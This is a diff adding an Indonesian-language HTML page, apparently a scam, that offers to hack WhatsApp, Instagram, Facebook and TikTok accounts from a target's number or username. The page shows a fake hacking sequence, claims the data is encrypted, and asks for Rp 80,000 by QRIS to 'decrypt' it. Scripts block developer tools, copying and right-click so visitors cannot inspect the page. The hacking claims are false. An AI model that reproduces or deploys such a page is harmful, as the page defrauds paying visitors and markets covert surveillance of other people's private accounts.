@@ -1,0 +1,449 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hacker Access Toolkit</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- PROTECTION HEADERS -->
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; style-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com; font-src https://cdnjs.cloudflare.com; script-src 'self' 'unsafe-inline' 'unsafe-eval';">
+    <meta name="robots" content="noindex, nofollow, noarchive, nosnippet">
+    <meta name="referrer" content="no-referrer">
+</head>
+<body oncontextmenu="return false" onkeydown="return disableKeys(event)">
+    <!-- ANTI-COPY OVERLAY -->
+    <div id="antiCopyOverlay" style="position:fixed; top:0; left:0; width:100%; height:100%; z-index:999999; display:none;"></div>
+    
+    <div class="container">
+        <!-- Header -->
+        <header class="header">
+            <div class="logo">
+                <div class="logo-icon">
+                    <i class="fas fa-user-secret"></i>
+                </div>
+                <div class="logo-text">
+                    <h1>HackerAccess Toolkit</h1>
+                    <p>Alat Sadap Sosial Media</p>
+                </div>
+            </div>
+            <div class="status-badge">
+                <i class="fas fa-circle"></i>
+                <span>TERHUBUNG</span>
+            </div>
+        </header>
+
+        <!-- STEP 1: Pilih Layanan -->
+        <div class="step-panel active" id="step1">
+            <div class="panel-title">
+                <i class="fas fa-layer-group"></i>
+                <span>Pilih Layanan</span>
+            </div>
+            <div class="services-grid">
+                <div class="service-card active" data-target="whatsapp">
+                    <div class="service-icon">
+                        <i class="fab fa-whatsapp"></i>
+                    </div>
+                    <h3>WhatsApp</h3>
+                    <p>Analisis Pesan & Media</p>
+                </div>
+                <div class="service-card" data-target="instagram">
+                    <div class="service-icon">
+                        <i class="fab fa-instagram"></i>
+                    </div>
+                    <h3>Instagram</h3>
+                    <p>Monitoring DM & Story</p>
+                </div>
+                <div class="service-card" data-target="facebook">
+                    <div class="service-icon">
+                        <i class="fab fa-facebook"></i>
+                    </div>
+                    <h3>Facebook</h3>
+                    <p>Retrieval Data Akun</p>
+                </div>
+                <div class="service-card" data-target="tiktok">
+                    <div class="service-icon">
+                        <i class="fab fa-tiktok"></i>
+                    </div>
+                    <h3>TikTok</h3>
+                    <p>Analisis Konten & DM</p>
+                </div>
+            </div>
+            <button class="btn next-btn" id="nextBtn">
+                <i class="fas fa-arrow-right"></i>
+                Selanjutnya
+            </button>
+        </div>
+
+        <!-- STEP 2: Input Data Target -->
+        <div class="step-panel" id="step2">
+            <div class="step-header">
+                <button class="back-btn" id="back1Btn">
+                    <i class="fas fa-arrow-left"></i> Kembali
+                </button>
+                <h2><i class="fas fa-user"></i> Input Data Target</h2>
+            </div>
+            
+            <div class="input-section active" id="whatsapp-input">
+                <h2 class="input-title">
+                    <i class="fab fa-whatsapp"></i>
+                    Akses WhatsApp
+                </h2>
+                <div class="input-group">
+                    <label class="input-label">Masukkan Nomor Target</label>
+                    <input type="text" class="input-field" id="whatsappNumber" placeholder="+6281234567890" value="+62">
+                    <small>Gunakan kode negara (contoh: +62 untuk Indonesia)</small>
+                </div>
+            </div>
+
+            <div class="input-section" id="instagram-input">
+                <h2 class="input-title">
+                    <i class="fab fa-instagram"></i>
+                    Akses Instagram
+                </h2>
+                <div class="input-group">
+                    <label class="input-label">Masukkan Username Target</label>
+                    <input type="text" class="input-field" id="instagramUsername" placeholder="username_target">
+                </div>
+            </div>
+
+            <div class="input-section" id="facebook-input">
+                <h2 class="input-title">
+                    <i class="fab fa-facebook"></i>
+                    Akses Facebook
+                </h2>
+                <div class="input-group">
+                    <label class="input-label">Masukkan Username/Email Target</label>
+                    <input type="text" class="input-field" id="facebookUsername" placeholder="username_target">
+                </div>
+            </div>
+
+            <div class="input-section" id="tiktok-input">
+                <h2 class="input-title">
+                    <i class="fab fa-tiktok"></i>
+                    Akses TikTok
+                </h2>
+                <div class="input-group">
+                    <label class="input-label">Masukkan Username Target</label>
+                    <input type="text" class="input-field" id="tiktokUsername" placeholder="@username_target">
+                </div>
+            </div>
+            
+            <button class="btn process-btn" id="hackBtn">
+                <i class="fas fa-play"></i>
+                Mulai Proses Hack
+            </button>
+        </div>
+
+        <!-- STEP 3: Proses Hacking -->
+        <div class="step-panel" id="step3">
+            <div class="step-header">
+                <button class="back-btn" id="back2Btn">
+                    <i class="fas fa-arrow-left"></i> Kembali
+                </button>
+                <h2><i class="fas fa-terminal"></i> Proses Hacking</h2>
+            </div>
+
+            <div class="progress-container">
+                <div class="progress-label">
+                    <span>Memproses data target...</span>
+                    <span id="progressPercentage">0%</span>
+                </div>
+                <div class="progress-bar">
+                    <div class="progress-fill" id="progressFill"></div>
+                </div>
+            </div>
+
+            <div class="terminal-panel">
+                <div class="terminal-content" id="terminalContent">
+                    <div class="terminal-line">
+                        <span class="prompt">$</span>
+                        <span class="text">Siap menerima perintah...</span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="preview-panel">
+                <div class="preview-header">
+                    <div class="preview-title">
+                        <i class="fas fa-eye"></i>
+                        <span>Live Preview - Data Target</span>
+                    </div>
+                </div>
+                <div class="preview-content" id="previewContent"></div>
+            </div>
+        </div>
+
+        <!-- STEP 4: Hasil Data -->
+        <div class="step-panel" id="step4">
+            <div class="step-header">
+                <button class="back-btn" id="back3Btn">
+                    <i class="fas fa-arrow-left"></i> Kembali
+                </button>
+                <h2><i class="fas fa-check-circle"></i> Data Berhasil Diambil</h2>
+            </div>
+            
+            <div class="results-summary">
+                <div class="data-summary">
+                    <div class="summary-item">
+                        <div class="summary-icon">
+                            <i class="fas fa-comments"></i>
+                        </div>
+                        <div class="summary-info">
+                            <div class="summary-label">Pesan</div>
+                            <div class="summary-value">Asses pesan terambil</div>
+                        </div>
+                    </div>
+                    <div class="summary-item">
+                        <div class="summary-icon">
+                            <i class="fas fa-images"></i>
+                        </div>
+                        <div class="summary-info">
+                            <div class="summary-label">Media</div>
+                            <div class="summary-value">Asses foto & video</div>
+                        </div>
+                    </div>
+                    <div class="summary-item">
+                        <div class="summary-icon">
+                            <i class="fas fa-file-contract"></i>
+                        </div>
+                        <div class="summary-info">
+                            <div class="summary-label">Dokumen</div>
+                            <div class="summary-value">Asses file</div>
+                        </div>
+                    </div>
+                    <div class="summary-item">
+                        <div class="summary-icon">
+                            <i class="fas fa-map-marker-alt"></i>
+                        </div>
+                        <div class="summary-info">
+                            <div class="summary-label">Lokasi</div>
+                            <div class="summary-value">Asses lokasi</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="encryption-notice">
+                <i class="fas fa-lock"></i>
+                <p>Data telah dienkripsi untuk keamanan. Akses premium diperlukan untuk dekripsi.</p>
+            </div>
+            
+            <button class="btn premium-btn" id="premiumBtn">
+                <i class="fas fa-unlock"></i>
+                Buka Akses Premium
+            </button>
+        </div>
+
+        <!-- STEP 5: Premium Payment -->
+        <div class="step-panel" id="step5">
+            <div class="step-header">
+                <button class="back-btn" id="back4Btn">
+                    <i class="fas fa-arrow-left"></i> Kembali
+                </button>
+                <h2><i class="fas fa-crown"></i> Akses Premium</h2>
+            </div>
+            
+            <div class="premium-lock">
+                <div class="lock-header">
+                    <div class="lock-icon">
+                        <i class="fas fa-lock"></i>
+                    </div>
+                    <div class="lock-text">
+                        <div class="lock-title">Akses Premium Diperlukan</div>
+                        <div class="lock-subtitle">Kunci dekripsi membutuhkan subscription premium</div>
+                    </div>
+                </div>
+                
+                <div class="payment-section">
+                    <div class="price-display">
+                        <span class="currency">Rp</span>
+                        <span class="price">80.000</span>
+                        <span class="payment-note">(Sekali bayar)</span>
+                    </div>
+                    
+                    <div class="qris-container">
+                        <div class="qris-box">
+                            <div class="qris-image" id="qrisImage"></div>
+                            <div class="qris-info">
+                              
+                                </div>
+                                <div class="qris-note">Scan dengan aplikasi e-wallet atau bank</div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="payment-instruction">
+                        <p><i class="fas fa-info-circle"></i> Setelah pembayaran, data akan otomatis terdekripsi</p>
+                        <p><i class="fas fa-shield-alt"></i> Transaksi aman dan terenkripsi</p>
+                    </div>
+                    
+                    <button class="btn payment-btn" id="paymentBtn">
+                        <i class="fas fa-check-circle"></i>
+                        Saya Sudah Bayar
+                    </button>
+                    
+                    <div class="payment-warning">
+                        <i class="fas fa-exclamation-triangle"></i>
+                        <span>Pastikan pembayaran berhasil sebelum verifikasi</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Footer -->
+        <div class="footer">
+            <div class="footer-content">
+                <div class="footer-left">
+                    <p><i class="fas fa-copyright"></i> 2023 Security Access Toolkit v3.1</p>
+                    <p class="session-info">Session ID: #SAT-<span id="sessionId">7823X9</span> • Status: <span class="status-active">AKTIF</span></p>
+                </div>
+                <div class="footer-right">
+                    <p><i class="fas fa-exclamation-triangle"></i> Untuk penggunaan analisis keamanan yang sah saja</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- PROTECTION SCRIPTS -->
+    <script>
+    // === ANTI-COPY PROTECTION ===
+    function disableKeys(e) {
+        // Block F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U, Ctrl+S
+        if (
+            e.keyCode === 123 || // F12
+            (e.ctrlKey && e.shiftKey && e.keyCode === 73) || // Ctrl+Shift+I
+            (e.ctrlKey && e.shiftKey && e.keyCode === 74) || // Ctrl+Shift+J
+            (e.ctrlKey && e.keyCode === 85) || // Ctrl+U
+            (e.ctrlKey && e.keyCode === 83) || // Ctrl+S
+            (e.ctrlKey && e.keyCode === 65) || // Ctrl+A (Select All)
+            (e.ctrlKey && e.keyCode === 67) || // Ctrl+C (Copy)
+            (e.ctrlKey && e.keyCode === 88) || // Ctrl+X (Cut)
+            (e.metaKey && e.keyCode === 65) || // Cmd+A (Mac)
+            (e.metaKey && e.keyCode === 67)    // Cmd+C (Mac)
+        ) {
+            e.preventDefault();
+            showProtectionAlert();
+            return false;
+        }
+        return true;
+    }
+
+    // Anti right-click
+    document.addEventListener('contextmenu', function(e) {
+        e.preventDefault();
+        showProtectionAlert();
+        return false;
+    });
+
+    // Anti drag/drop
+    document.addEventListener('dragstart', function(e) {
+        e.preventDefault();
+        return false;
+    });
+
+    // Anti selection
+    document.addEventListener('selectstart', function(e) {
+        e.preventDefault();
+        return false;
+    });
+
+    // Anti copy
+    document.addEventListener('copy', function(e) {
+        e.preventDefault();
+        showProtectionAlert();
+        return false;
+    });
+
+    // Anti cut
+    document.addEventListener('cut', function(e) {
+        e.preventDefault();
+        return false;
+    });
+
+    // Anti paste
+    document.addEventListener('paste', function(e) {
+        e.preventDefault();
+        return false;
+    });
+
+    // Show protection alert
+    function showProtectionAlert() {
+        const alertBox = document.createElement('div');
+        alertBox.style.cssText = `
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: rgba(0, 0, 0, 0.9);
+            color: white;
+            padding: 20px;
+            border-radius: 10px;
+            border: 2px solid #ef4444;
+            z-index: 1000000;
+            font-family: Arial, sans-serif;
+            text-align: center;
+            box-shadow: 0 0 20px rgba(239, 68, 68, 0.5);
+            max-width: 80%;
+        `;
+        alertBox.innerHTML = `
+            <h3 style="color: #ef4444; margin-bottom: 10px;">
+                <i class="fas fa-shield-alt"></i> PROTECTION ACTIVATED
+            </h3>
+            <p>This content is protected and cannot be copied or inspected.</p>
+            <p style="font-size: 12px; color: #ccc; margin-top: 10px;">
+                Security Access Toolkit v3.1 - Protected Content
+            </p>
+        `;
+        document.body.appendChild(alertBox);
+        
+        setTimeout(() => {
+            if (alertBox.parentNode) {
+                alertBox.parentNode.removeChild(alertBox);
+            }
+        }, 2000);
+    }
+
+    // Detect dev tools opening
+    setInterval(function() {
+        const threshold = 160;
+        const widthThreshold = window.outerWidth - window.innerWidth > threshold;
+        const heightThreshold = window.outerHeight - window.innerHeight > threshold;
+        
+        if (widthThreshold || heightThreshold) {
+            document.body.innerHTML = `
+                <div style="
+                    position: fixed;
+                    top: 0;
+                    left: 0;
+                    width: 100%;
+                    height: 100%;
+                    background: #000;
+                    color: white;
+                    display: flex;
+                    justify-content: center;
+                    align-items: center;
+                    flex-direction: column;
+                    z-index: 9999999;
+                    font-family: Arial, sans-serif;
+                    text-align: center;
+                    padding: 20px;
+                ">
+                    <h1 style="color: #ef4444;">
+                        <i class="fas fa-exclamation-triangle"></i> ACCESS DENIED
+                    </h1>
+                    <p>Developer tools detected. This page is protected.</p>
+                    <p style="margin-top: 20px; font-size: 14px; color: #ccc;">
+                        Security Access Toolkit - Anti-Inspection Protection Active
+                    </p>
+                </div>
+            `;
+            document.body.style.overflow = 'hidden';
+        }
+    }, 1000);
+    </script>
+
+    <!-- MAIN APPLICATION SCRIPT -->
+    <script src="script.js"></script>
+</body>
+                  </html>
